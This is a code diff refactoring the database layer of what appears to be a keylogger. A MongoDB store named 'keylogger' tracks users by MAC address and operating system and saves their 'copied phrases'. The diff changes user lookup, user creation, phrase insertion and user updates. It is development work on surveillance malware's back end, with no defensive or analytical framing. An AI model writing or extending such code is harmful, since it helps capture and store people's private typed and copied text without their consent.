@@ -21,8 +21,8 @@ def setup_database():
     db = client['keylogger']
 
 
-def get_user_id(user):
-    return db.users.find({"mac":user["mac"]})
+def get_user_id(user_dict):
+    return db.users.find_one({"mac": user_dict["mac"]})
 
 
 def get_users_by_os(os):
@@ -41,21 +41,22 @@ def get_copied_phrases(n=100):
 
 def get_or_create_user(user):
     user_dict = user.__dict__
-    user_obj = db.users.find_one(user_dict)
+    user_obj = get_user_id(user_dict)
     if user_obj is None:
         db.users.insert_one(user_dict)
-    return user
+    return get_user_id(user_dict)
 
 
 def insert_phrases(user, phrases_list):
+    user_id = get_user_id(user.__dict__)
+    if user_id is None:
+        logger.error("insert_phrases: Bad user id")
+    update_user(user)
     for p in phrases_list:
-        user_id = get_user_id(user.__dict__)
-        if user_id is None:
-            logger.error("insert_phrases: Bad user id")
         phrase = p.__dict__
         phrase['user_id'] = str(user_id)
         db.phrases.insert_one(phrase)
 
 
 def update_user(user):
-    db.users.update({"mac": user.mac}, {"$set": user}, upsert=False)
+    db.users.update({"mac": user.mac}, {"$set": user.__dict__ }, upsert=False)
